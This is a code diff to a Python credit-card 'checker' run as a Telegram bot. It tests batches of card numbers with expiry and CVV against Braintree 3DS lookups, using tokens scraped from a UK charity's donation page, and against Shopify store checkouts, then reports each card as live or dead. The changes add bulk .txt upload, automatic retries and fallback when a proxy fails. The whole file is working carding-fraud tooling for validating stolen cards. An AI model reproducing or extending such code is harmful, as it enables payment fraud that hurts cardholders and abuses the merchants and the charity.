@@ -3,7 +3,7 @@ import asyncio, aiohttp, json, re, random, time, threading, os, base64, requests
 import queue as _q
 from urllib.parse import urlparse
 from flask import Flask, request, jsonify
-from collections import OrderedDict, defaultdict
+from collections import OrderedDict
 from checker_q import *
 
 class C:
@@ -30,7 +30,7 @@ def banner():
    ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
 """
     for l in art.strip("\n").split("\n"): print(grad(l))
-    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v2.2{C.R}{C.D}  |  Termux/Pydroid{C.R}\n")
+    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v3.1{C.R}{C.D}  |  Termux/Codespace{C.R}\n")
 
 # ---------- Config ----------
 BATCH_MAX      = 1000
@@ -40,23 +40,11 @@ TG_SEND_DELAY  = 0.05
 RESULT_DIR     = "./results"
 os.makedirs(RESULT_DIR, exist_ok=True)
 
-TG_W           = 2          # total workers / lanes
+TG_W           = 1          # 1 worker for strict order
 
 # ---------- Proxies ----------
-RAW_PROXIES=[
-    "46.225.138.35:36759:l1lo6k6xsj:OetadXmeuu",
-    "172.93.105.208:43159:8u74d0ud33:nfRkcoqOel",
-    "172.93.105.208:43159:fsf409q9t6:eZ7Zr0QeM5",
-    "172.93.104.131:39603:i75k6kfk8x:ILug9moRKgL",
-    "172.93.104.131:39603:ncgh2p1l48:M9y57cFm1E",
-    "46.225.138.35:36759:6sw3iikwca:3q4owzbDzK",
-    "46.225.138.35:36759:6omuputmz1:s5GozZaMzC",
-    "172.93.105.208:43159:63hqmnwasr:Ng4RhfT2Vy",
-    "172.93.105.208:43159:bcwbryzsb7:OVpg6AsDMQ",
-    "172.93.105.208:43159:ztjuvz66ax:mpJxWou9Kt",
-    "46.225.138.35:36759:mr8v3lfvyg:xbkjKUqN8R",
-    "104.219.238.237:43645:t4a77l4bxe:pr3529Gknr",
-]
+# မင်းရဲ့ Private Proxy တွေ ဒီမှာ ထည့်ပါ (မရှိရင် အလွတ်ထားပါ)
+RAW_PROXIES = [] 
 WORKING=[]; _PI=0; _PLK=threading.Lock()
 
 def _tp(url):
@@ -70,7 +58,10 @@ def _tp(url):
 
 def validate_proxies():
     global WORKING
-    print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(RAW_PROXIES)} proxies × 3 formats){C.R}\n")
+    if not RAW_PROXIES:
+        print(f"{C.YEL}⚠ No proxies defined. Using direct Codespace IP.{C.R}\n")
+        return
+    print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(RAW_PROXIES)} proxies){C.R}\n")
     tot=len(RAW_PROXIES); w=[]; done=0; lk=threading.Lock()
     def run(raw):
         nonlocal done
@@ -79,6 +70,11 @@ def validate_proxies():
             ip,pt,u,pw=parts
             for sch in ("http","socks5h","socks5"):
                 url=f"{sch}://{u}:{pw}@{ip}:{pt}"
+                if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
+        elif len(parts)==2:
+            ip,pt=parts
+            for sch in ("http","socks5h","socks5"):
+                url=f"{sch}://{ip}:{pt}"
                 if _tp(url): found={"url":url,"raw":raw,"sch":sch}; break
         with lk:
             done+=1
@@ -92,10 +88,6 @@ def validate_proxies():
     print()
     WORKING=w
     print(f"\n  {C.LIME}✓{C.R} {C.B}Working: {C.GOLD}{len(w)}/{tot}{C.R}\n")
-    for i,x in enumerate(w,1):
-        ip=x["raw"].split(":")[0]
-        print(f"  {C.D}[{i:>2}]{C.R} {C.GOLD}{ip:<18}{C.R} {C.D}{x['sch']}{C.R}")
-    print()
 
 def get_proxy():
     global _PI
@@ -141,7 +133,7 @@ def bin_line(cc):
 
 def bin_dict(cc): return bin_lookup(cc[:6] if cc else "") or {}
 
-# ---------- Braintree ----------
+# ---------- Braintree (Fallback + 5s sleep) ----------
 SM={"authenticate_successful":"Passed","authenticate_attempt_successful":"Passed",
     "challenge_required":"OTP Required","authenticate_frictionless_failed":"OTP Required",
     "lookup_card_error":"Error","authenticate_rejected":"Declined","lookup_error":"Error",
@@ -149,65 +141,76 @@ SM={"authenticate_successful":"Passed","authenticate_attempt_successful":"Passed
 
 def bt_check(cc,mes,ano,cvv):
     st=time.time()
-    s=requests.Session()
-    s.headers.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                      "Accept-Language":"en-GB,en;q=0.9","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"})
-    s.cookies.set("cookie_test","please_accept_for_session"); s.cookies.set("civicAllowCookies","yes")
-    px=get_proxy()
-    auth=merch=None
-    for _ in range(3):
+    proxies_to_try = [get_proxy(), None] 
+    
+    for current_proxy in proxies_to_try:
+        s=requests.Session()
+        s.headers.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                          "Accept-Language":"en-GB,en;q=0.9","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"})
+        s.cookies.set("cookie_test","please_accept_for_session"); s.cookies.set("civicAllowCookies","yes")
+        
+        auth=merch=None
+        for _ in range(3):
+            try:
+                r=s.get("https://cllsupport.org.uk/donate/",timeout=15,proxies=current_proxy)
+                m=re.search(r'name="clientToken"\s+value="([^"]+)"',r.text) or re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]',r.text)
+                if not m:
+                    a=re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"',r.text)
+                    mm=re.search(r'"merchantId"\s*:\s*"([^"]+)"',r.text)
+                    if a: auth=a.group(1); merch=mm.group(1) if mm else "dyb5fmjx5t5wxckj"; break
+                if m:
+                    d=json.loads(base64.b64decode(m.group(1)).decode())
+                    auth=d.get("authorizationFingerprint",""); merch=d.get("merchantId","")
+                    if auth and merch: break
+            except: pass
+            time.sleep(1)
+            
+        if not auth: continue
+            
+        tok = None
         try:
-            r=s.get("https://cllsupport.org.uk/donate/",timeout=15,proxies=px)
-            m=re.search(r'name="clientToken"\s+value="([^"]+)"',r.text) or re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]',r.text)
-            if not m:
-                a=re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"',r.text)
-                mm=re.search(r'"merchantId"\s*:\s*"([^"]+)"',r.text)
-                if a: auth=a.group(1); merch=mm.group(1) if mm else "dyb5fmjx5t5wxckj"; break
-            if m:
-                d=json.loads(base64.b64decode(m.group(1)).decode())
-                auth=d.get("authorizationFingerprint",""); merch=d.get("merchantId","")
-                if auth and merch: break
-        except: pass
-        time.sleep(1)
-    if not auth: return False,"Auth Failed","Braintree 3DS2","0.00","USD"
-    try:
-        q="mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
-        h={"Authorization":f"Bearer {auth}","Braintree-Version":"2018-05-10","Content-Type":"application/json"}
-        body={"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"00000000-0000-0000-0000-000000000000"},
-              "query":q,"variables":{"input":{"creditCard":{"number":cc,"expirationMonth":mes,"expirationYear":ano,"cvv":cvv},"options":{"validate":False}}},"operationName":"TokenizeCreditCard"}
-        r=s.post("https://payments.braintree-api.com/graphql",headers=h,json=body,timeout=15,proxies=px)
-        d=r.json()
-        if "errors" in d or not d.get("data",{}).get("tokenizeCreditCard"): return False,"Token Failed","Braintree 3DS2","0.00","USD"
-        tok=d["data"]["tokenizeCreditCard"]["token"]
-    except Exception as e: return False,f"Token: {e}","Braintree 3DS2","0.00","USD"
-    try:
-        url=f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
-        pl={"amount":"1.00","browserColorDepth":24,"browserJavaEnabled":False,"browserJavascriptEnabled":True,
-            "browserLanguage":"en-GB","browserScreenHeight":800,"browserScreenWidth":360,"browserTimeZone":-345,
-            "deviceChannel":"Browser","additionalInfo":{"ipAddress":"8.8.8.8","billingLine1":"New York",
-            "billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US",
-            "billingPhoneNumber":"998773772","billingGivenName":"diwas","billingSurname":"Py","email":"diwasPy@gmail.com"},
-            "bin":cc[:6],"dfReferenceId":f"0_{random.randint(1000,9999)}-0000-0000-0000-000000000000",
-            "clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.115.1",
-            "cardinalDeviceDataCollectionTimeElapsed":random.randint(400,2000),
-            "issuerDeviceDataCollectionTimeElapsed":random.randint(800,5000),"issuerDeviceDataCollectionResult":True},
-            "authorizationFingerprint":auth,"braintreeLibraryVersion":"braintree/web/3.115.1",
-            "_meta":{"merchantAppId":"cllsupport.org.uk","platform":"web","sdkVersion":"3.115.1",
-            "source":"client","integration":"custom","integrationType":"custom","sessionId":"00000000-0000-0000-0000-000000000000"}}
-        r=s.post(url,headers={"Content-Type":"application/json"},json=pl,timeout=20,proxies=px)
-        lk=r.json() if r.status_code in (200,201) else {}
-    except Exception as e: return False,f"Lookup: {e}","Braintree 3DS2","0.00","USD"
-    cd="no_response"; en="UNKNOWN"
-    try:
-        cd=lk["paymentMethod"]["threeDSecureInfo"]["status"]
-        er=lk["paymentMethod"]["threeDSecureInfo"].get("enrolled")
-        en={"Y":"ENROLLED","N":"NOT_ENROLLED","U":"UNKNOWN"}.get(er,"UNKNOWN")
-    except:
-        ss=json.dumps(lk)
-        for c in SM:
-            if c in ss: cd=c; break
-    stt=SM.get(cd,"Unknown"); el=round(time.time()-st,2)
-    return (stt=="Passed"),f"{stt} | {en} | {cd} ({el}s)","Braintree 3DS2","1.00","USD"
+            q="mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
+            h={"Authorization":f"Bearer {auth}","Braintree-Version":"2018-05-10","Content-Type":"application/json"}
+            body={"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"00000000-0000-0000-0000-000000000000"},
+                  "query":q,"variables":{"input":{"creditCard":{"number":cc,"expirationMonth":mes,"expirationYear":ano,"cvv":cvv},"options":{"validate":False}}},"operationName":"TokenizeCreditCard"}
+            r=s.post("https://payments.braintree-api.com/graphql",headers=h,json=body,timeout=15,proxies=current_proxy)
+            d=r.json()
+            if "errors" in d or not d.get("data",{}).get("tokenizeCreditCard"): continue
+            tok=d["data"]["tokenizeCreditCard"]["token"]
+        except Exception: continue
+            
+        try:
+            url=f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
+            pl={"amount":"1.00","browserColorDepth":24,"browserJavaEnabled":False,"browserJavascriptEnabled":True,
+                "browserLanguage":"en-GB","browserScreenHeight":800,"browserScreenWidth":360,"browserTimeZone":-345,
+                "deviceChannel":"Browser","additionalInfo":{"ipAddress":"8.8.8.8","billingLine1":"New York",
+                "billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US",
+                "billingPhoneNumber":"998773772","billingGivenName":"diwas","billingSurname":"Py","email":"diwasPy@gmail.com"},
+                "bin":cc[:6],"dfReferenceId":f"0_{random.randint(1000,9999)}-0000-0000-0000-000000000000",
+                "clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.115.1",
+                "cardinalDeviceDataCollectionTimeElapsed":random.randint(400,2000),
+                "issuerDeviceDataCollectionTimeElapsed":random.randint(800,5000),"issuerDeviceDataCollectionResult":True},
+                "authorizationFingerprint":auth,"braintreeLibraryVersion":"braintree/web/3.115.1",
+                "_meta":{"merchantAppId":"cllsupport.org.uk","platform":"web","sdkVersion":"3.115.1",
+                "source":"client","integration":"custom","integrationType":"custom","sessionId":"00000000-0000-0000-0000-000000000000"}}
+            r=s.post(url,headers={"Content-Type":"application/json"},json=pl,timeout=20,proxies=current_proxy)
+            lk=r.json() if r.status_code in (200,201) else {}
+            
+            cd="no_response"; en="UNKNOWN"
+            try:
+                cd=lk["paymentMethod"]["threeDSecureInfo"]["status"]
+                er=lk["paymentMethod"]["threeDSecureInfo"].get("enrolled")
+                en={"Y":"ENROLLED","N":"NOT_ENROLLED","U":"UNKNOWN"}.get(er,"UNKNOWN")
+            except:
+                ss=json.dumps(lk)
+                for c in SM:
+                    if c in ss: cd=c; break
+            stt=SM.get(cd,"Unknown"); el=round(time.time()-st,2)
+            return (stt=="Passed"),f"{stt} | {en} | {cd} ({el}s)","Braintree 3DS2","1.00","USD"
+        except Exception: pass
+            
+    time.sleep(5) # ၅ စက္ကန့် နားမယ်
+    return False,"Lookup Error (Both Failed)","Braintree 3DS2","0.00","USD"
 
 # ---------- Shopify ----------
 BK={"US":("123 Main","NY","10080","NY","US","2194157586"),
@@ -454,7 +457,7 @@ async def process_card(cc,mes,ano,cvv,site,vid=None):
             if 'WaitingReceipt' in ft: return False,"Change Proxy",gw,tp,cur
             try:
                 rj=json.loads(ft); result=rj.get('data',{}).get('receipt',{}).get('processingError',{}).get('code')
-                if "shopify_payments" in str(rj): return True,"ORDER_PLACED",gw,tp,cur
+                if "shopify_payments" in str(rj) and "DECLINED" not in str(rj): return True,"ORDER_PLACED",gw,tp,cur
                 elif result: return True,result,gw,tp,cur
                 return True,"MISMATCHED_BILL",gw,tp,cur
             except: pass
@@ -479,15 +482,10 @@ def parse_batch(raw):
 
 # ---------- Flask ----------
 app=Flask(__name__)
-KEYS={f"AFUONA_{x}":f"client_{i+1:02d}" for i,x in enumerate([
-    "a7K9mQ2xLp4Rt8Vw","b3N8jH5yFd6Gs1Zc","c9P2vM7wQe3Xk5Lb","d4R6tY1uJn8Bf2Hm",
-    "e8W3sK5oPa9Cd7Gv","f1Q7zL4iXr2Nt6Jb","g5T9yU8hMv3Wp1Kc","h2J6rE4nBx7Ls9Qd",
-    "i7V1kP3aZt5Fm8Nw","j9X4wQ6cYd2Hb5Ru"])}
 
 @app.route('/')
 def root():
-    return jsonify({"app":"checker","status":"running","proxies":len(WORKING),
-                    "endpoints":{"/":"this","/shopi":"shopify","/bt":"braintree"}})
+    return jsonify({"app":"checker","status":"running","proxies":len(WORKING)})
 
 @app.route('/health')
 def health(): return jsonify({"ok":True})
@@ -523,7 +521,7 @@ _batch_lock=threading.Lock()
 _batch_seq=0
 _batches=OrderedDict()
 
-# per-worker lanes; each batch pinned to one lane
+# 1 worker lane
 _lanes=[_q.Queue() for _ in range(TG_W)]
 _lane_rr={"i":0}
 _lane_rr_lock=threading.Lock()
@@ -564,8 +562,7 @@ def _help():
             "▸ multi-line / comma separated supported\n"
             "▸ <code>/queue</code> · <code>/status</code> · <code>/help</code>\n\n"
             "<b>Example:</b>\n"
-            "<code>/bt 4111111111111111|12|2030|123</code>\n"
-            "<code>5555555555554444|01|2031|456</code>")
+            "<code>/bt 4111111111111111|12|2030|123</code>")
 
 def _status():
     with _slk:
@@ -649,33 +646,55 @@ def _worker(wid, lane):
                  "price":prc,"cur":cur,"el":el,"bin":bin_line(p['cc']),
                  "succ":succ,"idx":idx}
 
-            with _slk:
-                _st["p"]+=1
-                if succ: _st["live"]+=1
-                else:    _st["dead"]+=1
+            # ERROR DETECT -> RETRY
+            is_error = any(err in cl.upper() for err in ["LOOKUP ERROR", "NO SESSION", "BAD JSON", "REQ FAILED", "PROXY", "TIMEOUT", "ERROR"])
+            
+            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0; retries=[]
 
-            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0
-            with _batch_lock:
-                b=_batches.get(bid) if bid is not None else None
-                if b:
-                    b["done"].append(row)
-                    b["pending_rows"].append(row)
-                    done_n=len(b["done"]); total=b["total"]
-                    flush = len(b["pending_rows"])>=MSG_PER_BATCH
-                    prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
-                    finished = (done_n==total)
-                    if flush:
-                        rows_to_send=list(b["pending_rows"])
-                        b["pending_rows"].clear()
+            if is_error and bid is not None:
+                with _batch_lock:
+                    b=_batches.get(bid)
+                    if b:
+                        b["retry_queue"].append((mode,cid,mid,site,ccs,None,bid,idx))
+                        row = None # Don't show now, wait for retry
+            else:
+                with _slk:
+                    _st["p"]+=1
+                    if succ: _st["live"]+=1
+                    else:    _st["dead"]+=1
+
+            if row is not None:
+                with _batch_lock:
+                    b=_batches.get(bid) if bid is not None else None
+                    if b:
+                        b["done"].append(row)
+                        b["pending_rows"].append(row)
+                        done_n=len(b["done"]); total=b["total"]
+                        flush = len(b["pending_rows"])>=MSG_PER_BATCH
+                        prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
+                        finished = (done_n==total)
+                        if flush:
+                            rows_to_send=list(b["pending_rows"])
+                            b["pending_rows"].clear()
 
             if rows_to_send:
                 _send(cid,_result_block(rows_to_send),rt=mid,pm="HTML")
             if prog:
                 _send(cid,f"⏳ <b>Batch #{bid}</b> · {done_n}/{total} done",rt=mid,pm="HTML")
+                
             if finished:
                 with _batch_lock:
-                    b=_batches.pop(bid,None)
-                if b:
+                    b=_batches.get(bid)
+                    if b and b.get("retry_queue"):
+                        # Move to retries and DON'T pop batch yet
+                        retries = list(b["retry_queue"])
+                        b["retry_queue"].clear()
+                        # reset finished to false because we are not done yet
+                        finished = False
+                    else:
+                        b=_batches.pop(bid,None)
+                
+                if finished and b:
                     if b["pending_rows"]:
                         _send(cid,_result_block(b["pending_rows"]),rt=mid,pm="HTML")
                     _send(cid,_batch_summary(b),rt=mid,pm="HTML")
@@ -686,6 +705,12 @@ def _worker(wid, lane):
                                    rt=mid)
                     except Exception as e:
                         print(f"{C.D}[TG] dump: {e}{C.R}")
+                        
+            # Enqueue retries
+            for r_item in retries:
+                _lanes[lane].put(r_item)
+                with _slk: _st["q"]+=1
+
         except Exception as e:
             with _slk: _st["f"]+=1
             try: _send(cid,f"⚠️ {_esc(e)}",rt=mid,pm="HTML")
@@ -714,7 +739,8 @@ def _enqueue_batch(mode,cid,mid,site,ccs_list,invalid):
         _batches[bid]={"bid":bid,"cid":cid,"mid":mid,"mode":mode,"site":site,
                        "cards":list(ccs_list),"done":[],"pending_rows":[],
                        "invalid":list(invalid),"total":len(ccs_list),
-                       "lane":lane}
+                       "lane":lane,
+                       "retry_queue": []}  # <-- Retry အတွက်
     hdr=(f"📥 <b>Batch #{bid}</b> · {len(ccs_list)} card(s) queued · lane {lane+1}"
          + (f"\n⚠️ {len(invalid)} invalid skipped" if invalid else ""))
     _send(cid,hdr,rt=mid,pm="HTML")
@@ -732,6 +758,24 @@ def _handle(u):
             except: pass
         return
     txt=(m.get("text") or "").strip(); mid=m.get("message_id")
+    
+    # Handle TXT files
+    doc = m.get("document")
+    if doc and doc.get("file_name","").endswith(".txt"):
+        try:
+            file_id = doc["file_id"]
+            f_info = _tg("getFile", {"file_id": file_id})
+            if f_info and f_info.get("ok"):
+                path = f_info["result"]["file_path"]
+                f_url = f"https://api.telegram.org/file/bot{TG_TOKEN}/{path}"
+                r = requests.get(f_url)
+                if r.status_code == 200:
+                    txt = r.text
+                    _send(cid, "📄 <b>File received.</b> Parsing...", rt=mid, pm="HTML")
+        except Exception as e:
+            _send(cid, f"❌ File error: {e}", rt=mid, pm="HTML")
+            return
+            
     if not txt: return
     if txt in ("/start","/help"):
         _send(cid,_help(),rt=mid,pm="HTML"); return
@@ -759,6 +803,11 @@ def _handle(u):
         good,bad=parse_batch(raw)
         _enqueue_batch("shopify",cid,mid,site,good,bad)
         return
+    else:
+        # If it's a text file content without command, default to /check
+        good,bad=parse_batch(txt)
+        if good:
+            _enqueue_batch("shopify",cid,mid,DEFAULT_CART_URL,good,bad)
 
 def _poll():
     global _off
@@ -774,7 +823,7 @@ def _poll():
         except Exception as e: print(f"{C.D}[TG] poll: {e}{C.R}"); time.sleep(5)
 
 # ---------- Startup ----------
-DEFAULT_CART_URL="https://chewy-pawz.myshopify.com/cart/40234703421575:1"
+DEFAULT_CART_URL="https://farmhounds.com/cart/39773586686038:1"
 
 def ask_creds():
     global TG_TOKEN,TG_ADMIN
@@ -795,7 +844,7 @@ def tg_start():
     for i in range(TG_W):
         threading.Thread(target=_worker,args=(i+1, i),daemon=True).start()
     threading.Thread(target=_poll,daemon=True).start()
-    print(f"  {C.LIME}✓{C.R} Workers: {C.B}{TG_W}{C.R} (lanes 1..{TG_W})")
+    print(f"  {C.LIME}✓{C.R} Workers: {C.B}{TG_W}{C.R}")
     print(f"  {C.LIME}✓{C.R} Admin: {C.B}{TG_ADMIN}{C.R}\n")
 
 if __name__=="__main__":
